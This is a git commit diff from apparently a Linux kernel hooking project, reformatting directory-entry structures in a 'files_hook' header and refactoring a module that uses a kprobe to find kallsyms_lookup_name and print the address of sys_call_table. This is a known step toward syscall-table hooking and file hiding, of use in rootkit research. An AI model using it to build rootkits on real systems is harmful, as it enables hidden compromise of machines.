b64ff86bb6ffe942c804d431342c817536a80cef
MikeHorn-git <MikeHornProton@proton.me>
2024-11-13 23:14:49 +0100

    Update kallsyms_lookup & Format

--- module/files_hook/include/files_hook.h
+++ module/files_hook/include/files_hook.h
@@ -1,22 +1,22 @@
 #ifndef FILES_HOOK_H
 #define FILES_HOOK_H
 
-#include <linux/types.h>  // For __u32, __u64, etc.
+#include <linux/types.h> // For __u32, __u64, etc.
 
 /* Define structure for 64-bit linux_dirent64 */
 struct linux_dirent64 {
-    __u64 d_ino;       // Inode number
-    __s64 d_off;       // Offset to the next linux_dirent
-    unsigned short d_reclen;   // Length of this record
-    char d_name[];             // Filename (variable length)
+	__u64 d_ino; // Inode number
+	__s64 d_off; // Offset to the next linux_dirent
+	unsigned short d_reclen; // Length of this record
+	char d_name[]; // Filename (variable length)
 };
 
 /* Define structure for 32-bit linux_dirent */
 struct linux_dirent {
-    __u32 d_ino;       // Inode number
-    __s32 d_off;       // Offset to the next linux_dirent
-    unsigned short d_reclen;   // Length of this record
-    char d_name[];             // Filename (variable length)
+	__u32 d_ino; // Inode number
+	__s32 d_off; // Offset to the next linux_dirent
+	unsigned short d_reclen; // Length of this record
+	char d_name[]; // Filename (variable length)
 };
 
 #endif /* FILES_HOOK_H */
--- module/kallsyms_lookup/kallsyms_lookup.c
+++ module/kallsyms_lookup/kallsyms_lookup.c
@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0-only
 /*
  * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
- * https://github.com/humzak711
  */
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
@@ -11,42 +10,33 @@
 #include <linux/kprobes.h>
 #include <linux/moduleparam.h>
 
-typedef unsigned long (*kallsyms_ln_t)(const char *name);
-
-/* For each probe you need to allocate a kprobe structure */
 static struct kprobe kp = {
 	.symbol_name = "kallsyms_lookup_name",
 };
 
-/* Variable to hold the symbol name we want to look up */
-static char *symbol_name = "sys_call_table"; // Default symbol
-
-/* Register 'symbol_name' as a module parameter */
+static char *symbol_name = "sys_call_table";
 module_param(symbol_name, charp, 0644);
 MODULE_PARM_DESC(symbol_name, "Symbol name to look up with kallsyms");
 
 static int __init kallsyms_lookup_init(void)
 {
-	/* Register the kprobe to get the address of kallsyms_lookup_name */
 	register_kprobe(&kp);
-	kallsyms_ln_t kallsyms_ln = (kallsyms_ln_t)kp.addr;
-	unregister_kprobe(&kp);
 
-	/* Use the symbol_name parameter to look up the symbol */
-	if (kallsyms_ln) {
-		unsigned long address = kallsyms_ln(symbol_name);
-		pr_info("%s: Address of %s is: %lx\n", __func__, symbol_name,
-			address);
+	if (kp.addr) {
+		unsigned long address =
+			((unsigned long (*)(const char *))kp.addr)(symbol_name);
+		pr_info("Address of %s is: %lx\n", symbol_name, address);
 	} else {
 		pr_err("Failed to find kallsyms_lookup_name function\n");
 	}
 
+	unregister_kprobe(&kp);
 	return 0;
 }
 
 static void __exit kallsyms_lookup_exit(void)
 {
-	pr_info("kallsyms_lookup exit successfully\n");
+	pr_info("kallsyms_lookup exited successfully\n");
 }
 
 module_init(kallsyms_lookup_init) module_exit(kallsyms_lookup_exit)
